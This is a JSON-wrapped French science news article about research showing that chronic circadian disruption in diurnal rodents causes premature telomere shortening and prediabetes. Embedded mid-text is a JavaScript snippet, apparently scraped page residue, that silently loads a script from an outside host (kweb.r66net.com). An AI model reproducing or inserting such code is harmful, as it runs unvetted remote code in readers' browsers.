{"title": "Rythmes de vie : les horaires decales perturberaient la sante", "newspaper": "Futura Sciences", "author": ["CNRS"], "date_publi": "2015-11-12", "content": "Le prix Nobel de medecin 2017 vient d'etre decerne a trois chercheurs qui ont mis en lumiere les mecanismes fondamentaux de l'horloge interne des animaux. Tous, humains compris, suivent des activites biologiques periodiques et previsibles, et une alteration de ces rythmes est maintenant consideree comme pathogene. En 2015, des chercheurs demontraient que trois mois consecutifs de perturbations des cycles jour-nuit suffisent pour induire un vieillissement cellulaire premature et un etat prediabetique chez un rongeur diurne. Communique du CNRS paru le 12 novembre 2015 Le travail poste ou des voyages aeriens longs et frequents sont des conditions socioprofessionnelles devenues frequentes. Ces situations provoquent des expositions a la  lumiere  pendant la periode habituelle de repos, ainsi que des horaires de  sommeil  et de repas irreguliers. De nombreuses etudes epidemiologiques montrent que de telles conditions de desynchronisation circadienne favorisent l'apparition de troubles metaboliques, tels que le  diabete de type 2 , l' obesite  et les  maladies cardiovasculaires .  Chez les rongeurs  nocturnes , l'alteration experimentale des  rythmes circadiens  a ete souvent associee a une adiposite augmentee, une intolerance au  glucose  et une diminution de la  reponse immunitaire . Cette observation est intrigante car ces memes  symptomes  sont typiquement observes lors du vieillissement biologique. En effet, des perturbations circadiennes a long terme ou des deficiences  genetiques  affectant les horloges circadiennes conduisent a une  esperance de vie  raccourcie des  rongeurs . Ces observations suggerent que la desynchronisation des horloges circadiennes pourrait accelerer les mecanismes de vieillissement, qui, a leur tour, participeraient a l'apparition de troubles metaboliques. Pour tester cette hypothese, une equipe de l'institut des Neurosciences cellulaires et integratives a choisi d'etudier le rat roussard ( Arvicanthis ) en collaboration avec une equipe d'ecologistes de l'institut Pluridisciplinaire Hubert Curien, specialisee dans l'etude de la diversite et de l'evolution des longevites animales. Ce rongeur  diurne  est eleve au Chronobiotron de Strasbourg, une plateforme d'experimentation animale specialisee dans l'etude des rythmes biologiques. L'interet experimental du rat roussard reside dans le fait que les rongeurs diurnes, actifs durant la journee comme les humains, sont de meilleurs modeles animaux que les rongeurs nocturnes habituellement utilises pour etudier les liens entre  pathologies  humaines et rythmes  circadiens . Representation schematique de l'impact du << jet-lag >> (decalage horaire) chronique sur le vieillissement d'un rongeur diurne. La desynchronisation est induite par un protocole de jet-lag chronique qui consiste en une perturbation du cycle lumiere-obscurite pendant trois mois. La desynchronisation est mesuree grace a l'enregistrement de l'activite des animaux (representation schematique sous forme d'actogramme, ou chaque barre noire represente une periode d'activite). Il en resulte une diminution des telomeres, signe de vieillissement cellulaire, et un etat prediabetique caracterise par une intolerance au glucose (representation schematique des differences obtenues). (c) Edith Grosbellet                       Des raccourcissements precoces des telomeres Les equipes strasbourgeoises demontrent qu'un  decalage horaire  chronique (modification bihebdomadaire des cycles lumiere obscurite) pendant trois mois consecutifs seulement, provoque a la fois un etat prediabetique (intolerance au glucose) et des changements cellulaires normalement observes au cours du vieillissement biologique. Plus particulierement, il s'agit d'un raccourcissement precoce de la longueur d'une sequence specifique de l' ADN  situee au niveau des  telomeres  qui protegent les extremites non-codantes des  chromosomes  et qui sont perdus progressivement avec l'age. Autrement dit, ces resultats revelent que la desynchronisation circadienne entraine un  vieillissement cellulaire  premature.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Parmi les pistes mecanistiques etudiees, le  raccourcissement des telomeres  chez les animaux desynchronises ne semble pas attribuable a une augmentation du  stress oxydatif . En revanche, l'expression de sirtuine 1 (SIRT1), une  enzyme  impliquee dans de nombreux processus intracellulaires et qui possede le double role d'interagir avec les horloges circadiennes moleculaires et de proteger les telomeres, est reduite. Ainsi, chez les animaux jeunes soumis a la desynchronisation circadienne experimentale, SIRT 1 est presente a un niveau intermediaire entre les animaux jeunes et les animaux ages, non-desynchronises. La diminution de l'expression de SIRT1 fournit donc une premiere explication plausible du raccourcissement accelere des telomeres chez les animaux desynchronises. Des recherches complementaires seront necessaires pour mieux comprendre la nature exacte des mecanismes mis en jeu, mais ces travaux publies dans la revue  FASEB Journal  ouvrent maintenant la voie a une etude approfondie des acteurs cellulaires et moleculaires impliques dans l'impact de la desynchronisation circadienne sur le vieillissement. Ils soulignent egalement la necessite de developper des traitements preventifs chez les personnels sujets a des desynchronisations chroniques des rythmes circadiens. Vous avez aime cet article ? N'hesitez pas a le partager avec vos ami(e)s et aidez-nous a faire connaitre Futura :) ! La Redaction vous remercie. Facebook Twitter Google+ Linkedin Pinterest A voir aussi :  rythmes respiratoires  |  equations horaires  |  lois horaires  |  horaires des heures creuses  |  horaires cours iufm  |  lever de lune horaires  |  horaires conducteur travaux  |  fuseaux horaires exercices  |  equations horaires du mouvement  |  horaires a380 roissy", "theme": "sante"}